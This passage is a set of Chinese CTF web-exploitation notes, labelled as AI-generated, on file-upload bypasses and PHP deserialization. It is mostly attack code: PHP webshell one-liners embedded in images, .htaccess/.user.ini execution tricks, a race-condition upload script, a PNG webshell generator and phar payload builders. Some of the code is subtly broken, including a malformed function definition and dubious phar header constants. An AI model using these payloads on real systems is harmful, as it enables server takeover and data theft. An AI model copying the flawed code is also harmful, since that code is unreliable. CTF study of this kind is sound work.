- 使用参数化 API（如 Python subprocess 的列表参数）
- 白名单校验输入（如只允许字母数字）
- `escapeshellarg()` / `escapeshellcmd()` 转义（PHP）
- 禁用危险函数（`disable_functions`）

> AI生成

---

---

## Web 方向通用工具集

> 定位：竞赛时替换目标 URL 和参数名即可直接使用的自动化解题工具，区别于之前各题的一次性硬编码脚本。
>
> 存放路径：`Web/tools/`

### 工具清单

| 工具文件 | 功能 | 行数 | 核心能力 |
|---------|------|------|---------|
| `web_sqli_toolkit.py` | SQL 注入解题 | 844 | 自动检测注入点 / 布尔盲注二分提取 / UNION 回显利用 / 时间盲注 / Payload 速查表 |
| `web_dir_scanner.py` | 目录扫描 | 329 | 多线程并发 / 内置常用字典 / 自定义404过滤 / 递归扫描 / 扩展名自动补全 |
| `web_ssti_toolkit.py` | SSTI 模板注入 | 645 | 6种引擎自动识别(Jinja2/Twig/Freemarker/Velocity/Smarty/Mako) / 多利用链自动尝试 / 信息收集 / Payload 速查表 |
| `web_lfi_toolkit.py` | 文件包含漏洞 | 622 | 自动检测 / 12种绕过方式 / PHP伪协议(filter/input/data) / 日志投毒 / 批量敏感文件扫描 |
| `web_rce_bypass.py` | 命令执行绕过 | 584 | 关键字绕过(引号/反斜杠/变量拼接/通配符) / 空格绕过($IFS/<>/花括号) / 编码绕过(Base64/Hex/Oct) / 无字母数字Webshell(异或/取反/自增) |
| `web_ssrf_toolkit.py` | SSRF 服务端请求伪造 | 627 | 自动检测 / 内网端口探测 / 多协议构造(file/dict/ftp/gopher) / 云元数据读取(AWS/GCP/阿里云/腾讯云) / IP绕过测试 |
| `web_php_audit.py` | PHP 代码审计 | 557 | 危险函数扫描(7类) / 过滤函数分析(8种+绕过建议) / 输入流追踪 / 结构化审计报告 |

### 使用示例

```bash
# SQL 注入 — 自动检测注入点并提取数据
python Web/tools/web_sqli_toolkit.py detect -u "http://target/page?id=1"
python Web/tools/web_sqli_toolkit.py union -u "http://target/page?id=1"
python Web/tools/web_sqli_toolkit.py boolean -u "http://target/page?id=1" --true-mark "Welcome"

# 目录扫描 — 多线程扫描目标目录和敏感文件
python Web/tools/web_dir_scanner.py -u "http://target/" -t 20 --ext php,bak,txt

# SSTI — 自动检测模板引擎并利用
python Web/tools/web_ssti_toolkit.py -u "http://target/page?name=test" --param name
python Web/tools/web_ssti_toolkit.py -u "http://target/page?name=test" --param name --engine jinja2 --exec "id"

# LFI — 自动检测并读取文件
python Web/tools/web_lfi_toolkit.py -u "http://target/page?file=test" --param file
python Web/tools/web_lfi_toolkit.py -u "http://target/page?file=test" --param file --php-filter --read /var/www/html/index.php

# 命令执行绕过 — 生成各种绕过 payload
python Web/tools/web_rce_bypass.py -c "cat /flag"
python Web/tools/web_rce_bypass.py --webshell --cmd "system('id');"

# SSRF — 检测并利用
python Web/tools/web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url
python Web/tools/web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url --scan-ports
python Web/tools/web_ssrf_toolkit.py -u "http://target/fetch?url=test" --param url --metadata

# PHP 代码审计 — 扫描源码
python Web/tools/web_php_audit.py -f source.php --trace
python Web/tools/web_php_audit.py -d /path/to/project/ --report
```

---

---

## 文件上传漏洞系统专题

> 难度定位：初中级。文件上传是 CTF Web 方向最高频考点之一，几乎所有比赛都有。现有第 20 题记录了具体解题过程，本专题补充系统性方法论。

### 1. 文件上传漏洞分类与判断流程

```
发现上传点
  │
  ├─ 前端验证? → 浏览器关闭 JS / Burp 改包绕过
  │
  ├─ 后端验证?
  │   ├─ Content-Type 检查? → 改 Content-Type: image/jpeg
  │   ├─ 后缀名检查?
  │   │   ├─ 黑名单? → 尝试冷门后缀 (.phtml .pht .phar .php5 .php7 .shtml)
  │   │   ├─ 白名单? → 尝试 %00 截断 / 双写 / 大小写
  │   │   └→ .htaccess / .user.ini 绕过
  │   ├─ 文件内容检查?
  │   │   ├─ MIME 头检查? → GIF89a 头 + 代码
  │   │   ├─ getimagesize()? → 图片马 + 文件包含
  │   │   └ 二次渲染? → 绕过方法见下文
  │   └─ 条件竞争? → 快速上传+访问
  │
  └─ 无验证? → 直接传脚本
```

### 2. 后缀名绕过速查

**黑名单绕过**（服务器禁止 .php）：

| 尝试后缀 | 说明 | 适用环境 |
|---------|------|---------|
| `.phtml` | PHP 替代后缀 | Apache |
| `.pht` | PHP 替代后缀 | Apache |
| `.phar` | PHP 归档 | Apache/Nginx+PHP |
| `.php5` `.php7` | PHP 版本后缀 | Apache（配置允许时）|
| `.shtml` | SSI 注入 | Apache mod_ssi |
| `.asp` `.aspx` `.cer` | ASP/ASPX | IIS |
| `.asa` `.cdx` | ASP 替代 | IIS |
| `.jsp` `.jspx` | JSP | Tomcat |
| `.war` | Java Web 归档 | Tomcat |
| `.` (文件名末尾加点) | Windows 去尾特性 | Windows |
| `.php.` (末尾多一者) | Windows 流特性 | Windows |
| `.php (空格)` | Windows 去空格 | Windows |
| `.pHP` | 大小写绕过 | 区分大小写的服务器 |
| `.php%00` | 空字节截断 | PHP < 5.3.4 |
| `.php\x00` | 同上（二进制） | PHP < 5.3.4 |

**白名单绕过**（只允许 .jpg/.png/.gif）：

| 方法 | 说明 |
|------|------|
| `%00` 截断 | `shell.php%00.jpg` → PHP 截断为 `shell.php`（PHP < 5.3.4） |
| 双写绕过 | `shell.p.phphp` → 过滤后变 `shell.php` |
| `.htaccess` | 上传 .htaccess 使 jpg 当 PHP 执行 |
| `.user.ini` | 上传 .user.ini 使指定文件加载 PHP 代码 |
| 图片马 + 文件包含 | 上传含 PHP 代码的图片，配合 LFI 执行 |
| POST 保存路径截断 | 路径参数 `upload/shell.php%00` 截断 |

### 3. .htaccess 绕过详解

上传 `.htaccess` 文件使图片文件被当作 PHP 执行：

```apache
# 方法1: 指定文件名
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>

# 方法2: 按目录
AddType application/x-httpd-php .jpg

# 方法3: 正则匹配
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### 4. .user.ini 绕过详解

`.user.ini` 是 PHP 的用户级配置文件，比 .htaccess 更通用（Nginx+PHP-FPM 也适用）：

```ini
; 使每次 PHP 执行前自动加载 shell.jpg
auto_prepend_file=shell.jpg
```

上传 `.user.ini` 后，同目录下任何 PHP 文件执行时都会先加载 `shell.jpg`（内容为 PHP 代码的图片）。

### 5. 图片马制作

```bash
# 方法1: copy 拼接
copy normal.jpg/b + shell.php/a shell.jpg

# 方法2: 直接在图片末尾追加 PHP 代码
echo '<?php system($_GET["cmd"]); ?>' >> normal.jpg

# 方法3: GIF 头 + 代码
echo -ne 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# 方法4: PNG IDAT 写入（绕过二次渲染，进阶）
# 使用脚本将 PHP 代码写入 PNG IDAT 块中
```

### 6. 二次渲染绕过

部分应用会对上传的图片重新渲染（如 `imagecreatefromjpeg`），会破坏图片中的代码。绕过方法：

**GIF**：对比原始图和渲染后的图，在未变化区域写入代码。

**PNG**：将代码写入 IDAT 块，利用 CRC 校验特性。以下脚本自动生成绕过二次渲染的 PNG：

```python
#!/usr/bin/env python3
"""
CTF 解题工具 — PNG 二次渲染绕过图片生成
用途: 生成包含 PHP 代码且能绕过二次渲染的 PNG 图片
场景: 文件上传题目中二次渲染场景的绕过
"""
import struct
import zlib

def make_png_with_code php_code='<?php $_GET["cmd"]; ?>'):
    """生成包含 PHP 代码的 PNG 图片"""
    # PNG 签名
    signature = b'\x89PNG\r\n\x1a\n'
    
    # IHDR 块 —— 1x1 像素，8位深度
    width = 1
    height = 1
    ihdr_data = struct.pack('>IIBBBBB', width, height, 8, 0, 0, 0, 0)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data) & 0xFFFFFFFF
    ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
    
    # IDAT 块 —— 将 PHP 代码编码进像素数据
    raw_data = b'\x00' + php_code.encode()
    compressed = zlib.compress(raw_data)
    idat_crc = zlib.crc32(b'IDAT' + compressed) & 0xFFFFFFFF
    idat = struct.pack('>I', len(compressed)) + b'IDAT' + compressed + struct.pack('>I', idat_crc)
    
    # IEND 块
    iend_crc = zlib.crc32(b'IEND') & 0xFFFFFFFF
    iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
    
    png = signature + ihdr + idat + iend
    return png

if __name__ == '__main__':
    import sys
    code = '<?php system($_GET["cmd"]); ?>'
    if len(sys.argv) > 1:
        code = sys.argv[1]
    
    png_data = make_png_with_code(code)
    output = 'shell.png'
    with open(output, 'wb') as f:
        f.write(png_data)
    print(f"[+] PNG 图片已生成: {output}")
    print(f"    PHP 代码: {code}")
    print(f"    文件大小: {len(png_data)} 字节")
```

### 7. 条件竞争上传

条件竞争适用于服务器先保存文件、再检查删除的场景：

```python
#!/usr/bin/env python3
"""
CTF 解题工具 — 文件上传条件竞争脚本
用途: 在服务器删除文件前快速访问执行
场景: 服务器先保存后检查的文件上传场景
"""
import requests
import threading
import time
import sys

def upload_loop(url, file_field, filename, content, interval=0.01):
    """持续上传文件"""
    while True:
        try:
            files = {file_field: (filename, content, 'image/jpeg')}
            requests.post(url, files=files, timeout=5)
        except:
            pass
        time.sleep(interval)

def access_loop(url, interval=0.005):
    """持续访问上传的文件"""
    while True:
        try:
            resp = requests.get(url, timeout=2)
            if resp.status_code == 200 and 'flag' in resp.text.lower():
                print(f"\n[+] 命中! 响应: {resp.text[:200]}")
                return True
        except:
            pass
        time.sleep(interval)

if __name__ == '__main__':
    upload_url = "http://target/upload.php"
    access_url = "http://target/uploads/shell.php"
    
    # 上传内容: 临时写入 flag 到固定文件
    content = '<?php file_put_contents("flag.txt", "test"); system("cat /flag"); ?>'
    
    print(f"[*] 上传目标: {upload_url}")
    print(f"[*] 访问目标: {access_url}")
    print(f"[*] 启动 10 上传线程 + 5 访问线程")
    
    # 启动上传线程
    for i in range(10):
        t = threading.Thread(target=upload_loop, args=(upload_url, 'file', 'shell.php', content), daemon=True)
        t.start()
    
    # 启动访问线程
    for i in range(5):
        t = threading.Thread(target=access_loop, args=(access_url,), daemon=True)
        t.start()
    
    # 主线程等待
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] 停止")
```

### 8. 文件上传考点速查表

| 场景 | 判断方法 | 绕过方式 |
|------|---------|---------|
| 前端 JS 验证 | Burp 改包能传 | 关闭 JS / Burp 改包 |
| Content-Type 检查 | 报错提到 MIME | 改 Content-Type: image/jpeg |
| 后缀黑名单 | .php 被拦但 .phtml 能传 | 冷门后缀 |
| 后缀白名单 | 只有图片后缀能传 | %00截断 / .htaccess / .user.ini |
| 文件头检查 | 报错提到文件头 | GIF89a + 代码 |
| getimagesize() | 上传成功但无法执行 | 图片马 + 文件包含 |
| 二次渲染 | 上传后图片中代码消失 | PNG IDAT 写入 |
| 条件竞争 | 上传后文件很快消失 | 多线程上传+访问 |
| 路径可控 | 上传路径可改 | 路径穿越 / 截断 |

---

---

## PHP 反序列化进阶（phar / session / \_\_wakeup 绕过）

> 难度定位：中高级。前面已有反序列化基础专题，本篇补充 CTF 中更常见的进阶考点。

### 1. 魔术方法触发顺序

反序列化利用的核心是利用 PHP 魔术方法自动调用的特性构造利用链。

```
反序列化触发链:
unserialize() → __wakeup() → __destruct()
              → __toString()（当对象被当作字符串使用时）
              → __call()（当调用不存在的方法时）
              → __get()（当访问不存在的属性时）
              → __set()（当写入不存在的属性时）
              → __invoke()（当对象被当作函数调用时）
```

**CTF 常见利用链模式**：

```
// 模式1: wakeup → toString → call → 目标函数
$a = new Evil();          // __construct
$a->cmd = "system";       // 设置属性
unserialize(serialize($a));
// → __wakeup() 触发 → echo $obj → __toString() → $func() → __call()

// 模式2: destruct 清理链
$a = new A();
$a->obj = new B();
// 反序列化后 __destruct → 调用 $this->obj->method() → __call()

// 模式3: invoke 链
$a = new A();
$a->func = new B();
// $this->func() → B::__invoke() → 目标
```

### 2. \_\_wakeup() 绕过

**CVE-2016-7124**：当反序列化字符串中属性个数大于真实属性个数时，`__wakeup()` 不被调用。

适用版本：**PHP 5.6.25 之前 / PHP 7.0.10 之前**

```php
// 原始序列化
O:4:"User":2:{s:3:"cmd";s:2:"id";s:4:"flag";s:4:"test";}

// 绕过 __wakeup: 将属性个数 2 改为 3（大于真实个数 2）
O:4:"User":3:{s:3:"cmd";s:2:"id";s:4:"flag";s:4:"test";}
//                  ^ 改为 3，__wakeup 不执行
```

**绕过脚本**：

```python
#!/usr/bin/env python3
"""
CTF 解题工具 — PHP 序列化字符串修改器
用途: 修改 PHP 序列化字符串，绕过 __wakeup 等检查
场景: PHP 反序列化竞赛题
"""
import re
import sys

def bypass_wakeup(serialized):
    """绕过 __wakeup: 将属性个数改大"""
    # 匹配 O:len:"name":count:{...}
    match = re.match(r'(O:\d+:"[^"]+":)(\d+)(:.*)', serialized, re.DOTALL)
    if match:
        prefix = match.group(1)
        count = int(match.group(2))
        rest = match.group(3)
        new_count = count + 1
        result = f"{prefix}{new_count}{rest}"
        print(f"[*] 原始属性数: {count} → 修改为: {new_count}")
        return result
    print("[!] 无法匹配序列化字符串格式")
    return serialized

def change_visibility(serialized, class_name, prop_name, from_private=False):
    """
    修改属性可见性绕过
    private 属性: \x00ClassName\x00propName
    protected 属性: \x00*\x00propName
    public 属性: propName
    """
    if from_private:
        old = f"\x00{class_name}\x00{prop_name}"
        new = f"\x00*\x00{prop_name}"
    else:
        old = f"\x00*\x00{prop_name}"
        new = prop_name
    return serialized.replace(old, new)

def modify_value(serialized, key, new_value):
    """修改序列化字符串中某个键的值"""
    # 匹配 s:len:"key";s:len:"value";
    pattern = rf'(s:\d+:"{key}";s:)\d+(:")[^"]*(")'
    replacement = rf'\g<1>{len(new_value)}\g<2>{new_value}\g<3>'
    result = re.sub(pattern, replacement, serialized)
    if result != serialized:
        print(f"[*] 修改 {key} 的值为: {new_value}")
    return result

if __name__ == '__main__':
    # 示例: 绕过 __wakeup
    payload = 'O:4:"User":2:{s:3:"cmd";s:2:"id";s:4:"flag";s:4:"test";}'
    print(f"原始: {payload}")
    result = bypass_wakeup(payload)
    print(f"修改: {result}")
```

### 3. phar 反序列化

**原理**：phar 文件的 manifest 部分以序列化格式存储元数据。当通过 `file_exists()`、`is_dir()`、`file_get_contents()` 等文件函数访问 phar 文件时，会自动反序列化其中的元数据。

**优势**：不需要 `unserialize()` 函数，只要有文件操作函数且 `phar.readonly = Off`（默认 On，但比赛中常开启）。

**触发 phar 反序列化的函数**（部分）：

| 函数 | 触发 |
|------|------|
| `file_exists()` | 是 |
| `is_file()` / `is_dir()` | 是 |
| `file_get_contents()` | 是 |
| `fopen()` / `fread()` | 是 |
| `getimagesize()` | 是 |
| `gethostbyname()` | 是（DNS 相关） |
| `copy()` / `rename()` / `unlink()` | 是 |
| `sha1_file()` / `md5_file()` | 是 |

**制作 phar 文件**：

```php
<?php
// 生成 phar 文件的 PHP 脚本（需要在服务器上执行，或本地 PHP 环境）
// php.ini 中设置 phar.readonly = Off

class Evil {
    public $cmd = "system('cat /flag');";
}

$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");  // 文件头伪装
$phar->setMetadata(new Evil());                        // 恶意序列化对象
$phar->addFromString("test.txt", "test");              // 添加一个文件
$phar->stopBuffering();

echo "phar 文件已生成: evil.phar\n";
```

**利用流程**：
1. 制作含恶意序列化对象的 phar 文件
2. 将后缀改为 .jpg / .png / .gif 绕过后缀检查
3. 上传到服务器
4. 触发文件操作函数访问 phar 文件路径
5. 自动反序列化执行利用链

**Python 生成 phar 文件**（无需 PHP 环境）：

```python
#!/usr/bin/env python3
"""
CTF 解题工具 — Phar 文件生成器
用途: 生成包含 PHP 序列化对象的 phar 文件
场景: phar 反序列化竞赛题
"""
import struct
import hashlib

def build_phar(class_name, properties, stub="GIF89a<?php __HALT_COMPILER(); ?>"):
    """
    构造 phar 文件
    class_name: 类名
    properties: 属性字典 {name: value}
    stub: phar 文件头
    """
    # 1. 构造序列化 metadata
    prop_count = len(properties)
    serialized_props = ""
    for name, value in properties.items():
        serialized_props += f's:{len(name)}:"{name}";s:{len(value)}:"{value}";'
    metadata = f'O:{len(class_name)}:"{class_name}":{prop_count}:{{{serialized_props}}}'

    # 2. 构造 manifest
    manifest_data = b''
    manifest_data += struct.pack('>I', 1)             # 文件数量
    manifest_data += struct.pack('>I', 17)            # 版本
    manifest_data += struct.pack('>I', 0)             # 标志
    manifest_data += struct.pack('>I', len(metadata)) # metadata 长度
    manifest_data += metadata.encode()
    manifest_data += struct.pack('>I', 0x00001000)    # 别名长度

    # 3. 构造文件条目（最简单的 test.txt）
    filename = b"test.txt"
    file_data = b"test"
    file_entry = struct.pack('>I', len(filename))     # 文件名长度
    file_entry += filename                             # 文件名
    file_entry += struct.pack('>I', len(file_data))   # 文件大小
    file_entry += struct.pack('>I', 0)                # 时间戳
    file_entry += struct.pack('>I', len(file_data))   # 压缩后大小
    file_entry += struct.pack('>I', 0x1B6)            # CRC32
    file_entry += struct.pack('>I', 0x00001000)       # 标志
    file_entry += struct.pack('>I', 0)                # 元数据长度

    # 4. 组装
    stub_bytes = stub.encode()
    manifest_length = len(manifest_data) + len(file_entry)

    phar = stub_bytes
    phar += struct.pack('>I', len(manifest_data) + 4)  # manifest 长度
    phar += manifest_data
    phar += file_entry
    phar += file_data

    # 5. 计算签名（SHA1）
    signature = hashlib.sha1(phar).digest()
    phar += signature
    phar += b'\x02'  # SHA1 标志
    phar += b'GBMB'  # phar 签名结尾

    return phar

if __name__ == '__main__':
    # 示例: 生成含 Evil 类的 phar
    phar_data = build_phar(
        class_name="Evil",
        properties={"cmd": "system('cat /flag');"},
        stub="GIF89a<?php __HALT_COMPILER(); ?>"
    )
    with open("evil.phar", "wb") as f:
        f.write(phar_data)
    print(f"[+] phar 文件已生成: evil.phar ({len(phar_data)} 字节)")
    print(f"[+] 上传后通过文件函数触发反序列化")
```

### 4. Session 反序列化

**原理**：PHP 的 session 存储格式取决于 `session.serialize_handler` 配置。当页面与默认 handler 不同时，序列化/反序列化不一致导致对象注入。

**三种 session 序列化处理器**：

| 处理器 | 格式 | 示例 |
|--------|------|------|
| `php` | 键名|序列化值 | `name|s:4:"test";` |
| `php_serialize` | 完整序列化 | `a:1:{s:4:"name";s:4:"test";}` |
| `php_binary` | 键长+键名+序列化值 | `\x04names:4:"test";` |

**利用场景**：当上传页面的 `session.serialize_handler = php_serialize`，而另一页面用默认 `php` handler 读取时：

```php
// 上传页面 (php_serialize)
$_SESSION['name'] = '|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}';
// 存储为: a:1:{s:4:"name";s:46:"|O:4:"Evil":1:{s:3:"cmd";s:2:"id";}";}

// 读取页面 (php 默认)
// 按 | 分割: 键 = a:1:{s:4:"name";s:46:" 值 = O:4:"Evil":1:{s:3:"cmd";s:2:"id";}
// 反序列化值 → 触发 Evil 对象
```

### 5. 反序列化考点速查

| 考点特征 | 判断方法 | 绕过/利用方式 |
|---------|---------|-------------|
| 有 `unserialize()` | 代码审计 | 构造POP链 |
| `__wakeup()` 阻断 | PHP < 7.0.10 | 属性个数+1 绕过 |
| 有文件操作无 unserialize | 搜索 phar | phar 反序列化 |
| session 读写不同页面 | 检查 php.ini | session 处理器差异 |
| 过滤特定类名 | 搜索替代类 | PHP 内置类 (SplFileObject) |
| 只读文件 | SplFileObject | `SplFileObject('/flag')` 读文件 |
| 命令执行被禁 | disable_functions | file_put_contents 写文件 |

---

---

> AI生成